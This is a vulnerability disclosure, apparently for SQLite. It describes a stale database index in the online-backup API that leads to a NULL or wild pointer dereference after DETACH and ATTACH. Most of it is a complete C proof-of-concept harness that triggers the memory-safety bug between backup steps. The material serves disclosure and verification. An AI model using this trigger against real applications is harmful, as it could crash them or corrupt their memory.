Summary
Commit e8e5b76d41 changed sqlite3_backup to store its source database as an integer index iSrc into pSrcDb->aDb[], re-resolving the Btree* on every step via getSourceBtree(p) = p->pSrcDb->aDb[p->iSrc].pBt (src/backup.c:46-54). This stays valid across ATTACH (append only) but breaks across DETACH, because detachFunc() (src/attach.c:293-349) blocks only the database being detached and sqlite3CollapseDatabaseArray() (src/build.c:600-620) shifts every higher slot down without fixing any live backup's iSrc. If the source is aDb[3] and a lower db aDb[2] is detached then a new db is re-attached into slot 3, getSourceBtree() returns the wrong btree, and sqlite3_backup_finish() walks the wrong pager's backup list (while(*pp!=p) pp=&(*pp)->pNext;) off the end into a NULL or wild pointer dereference (CWE-825 / CWE-476).

The trigger requires running DETACH <lower>; ATTACH <new>; on the source connection between two sqlite3_backup_step() calls while the backup object is alive, which is the normal online-backup usage pattern. It is not reachable from the ./sqlite3 CLI, whose only backup surface runs the whole backup_init, backup_step loop, and backup_finish atomically inside one dot-command with no window for user SQL. Verification therefore needs a host application that drives the backup C-API incrementally.

PoC
The harness builds the attach layout, opens an online backup on an attached source, and performs the DETACH+ATTACH interleave the CLI cannot:
#include <stdio.h>
#include <stdlib.h>
#include "sqlite3.h"

static void must(sqlite3 *db, int rc, const char *what) {
if (rc != SQLITE_OK && rc != SQLITE_DONE && rc != SQLITE_ROW) {
fprintf(stderr, "FATAL: %s -> rc=%d: %s\n", what, rc,
db ? sqlite3_errmsg(db) : "(no db)");
exit(2);
}
}

static void run(sqlite3 *db, const char *sql) {
char *err = 0;
int rc = sqlite3_exec(db, sql, 0, 0, &err);
if (rc != SQLITE_OK) {
fprintf(stderr, "FATAL: exec [%s] -> rc=%d: %s\n", sql, rc,
err ? err : sqlite3_errmsg(db));
exit(2);
}
sqlite3_free(err);
}

int main(void) {
sqlite3 *db = 0, *dest = 0;
int rc;

/* Fresh files each run. */
remove("h_main.db");  remove("h_main.db-journal");
remove("h_a.db");     remove("h_a.db-journal");
remove("h_b.db");     remove("h_b.db-journal");
remove("h_c.db");     remove("h_c.db-journal");
remove("h_dest.db");  remove("h_dest.db-journal");

rc = sqlite3_open("h_main.db", &db);
must(db, rc, "open source");

/* Build attach layout: a (slot 2, lower), b (slot 3, source). */
run(db, "ATTACH DATABASE 'h_a.db' AS a;");
run(db, "ATTACH DATABASE 'h_b.db' AS b;");

/* Put real content into source db "b" so backup has pages to copy and so
* we have a Btree to dangle. */
run(db, "CREATE TABLE b.t(x INTEGER PRIMARY KEY, y);");
run(db, "BEGIN;");
run(db, "WITH RECURSIVE s(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM s WHERE n<5000)"
" INSERT INTO b.t(x,y) SELECT n, randomblob(64) FROM s;");
run(db, "COMMIT;");
/* Some content in a too. */
run(db, "CREATE TABLE a.u(z);");
run(db, "INSERT INTO a.u VALUES (1),(2),(3);");

rc = sqlite3_open("h_dest.db", &dest);
must(dest, rc, "open dest");

/* Start an online backup with SOURCE = attached db "b" (iSrc resolves to 3). */
sqlite3_backup *bk = sqlite3_backup_init(dest, "main", db, "b");
if (!bk) {
fprintf(stderr, "FATAL: backup_init -> %s\n", sqlite3_errmsg(dest));
return 2;
}
printf("[*] backup_init ok; source='b' (expected iSrc=3)\n");

/* Copy a few pages, then STOP with the backup object still alive. */
rc = sqlite3_backup_step(bk, 5);
printf("[*] first backup_step(5) -> rc=%d (remaining=%d)\n",
rc, sqlite3_backup_remaining(bk));
if (rc != SQLITE_OK && rc != SQLITE_DONE) {
fprintf(stderr, "FATAL: first step rc=%d %s\n", rc, sqlite3_errmsg(db));
return 2;
}

/* === THE INTERLEAVE the CLI cannot perform === */
/* DETACH the lower-indexed db "a": CollapseDatabaseArray shifts "b"
* from aDb[3] to aDb[2]; backup->iSrc stays 3 (stale). */
printf("[*] DETACH a  (collapses aDb[]; backup iSrc now stale)\n");
run(db, "DETACH DATABASE a;");

/* Re-ATTACH a different db "c": reuses slot 3 with a NEW Btree*. */
printf("[*] ATTACH c  (reuses freed slot 3 with a different Btree)\n");
run(db, "ATTACH DATABASE 'h_c.db' AS c;");
run(db, "CREATE TABLE c.w(q);");

/* Continue the backup. getSourceBtree(p)=aDb[3].pBt now points at "c",
* not "b", causing type confusion. */
printf("[*] resuming backup_step on stale iSrc...\n");
do {
rc = sqlite3_backup_step(bk, 100);
} while (rc == SQLITE_OK);
printf("[*] backup_step loop ended rc=%d\n", rc);

/* finish walks the (possibly wrong) pager backup list. */
rc = sqlite3_backup_finish(bk);
printf("[*] backup_finish rc=%d\n", rc);

/* Touch the source again to exercise any dangling backup pointer. */
run(db, "INSERT INTO b.t(x,y) VALUES (999999, randomblob(32));");

sqlite3_close(dest);
sqlite3_close(db);
printf("[*] done (no ASan report => not triggered)\n");
return 0;
}

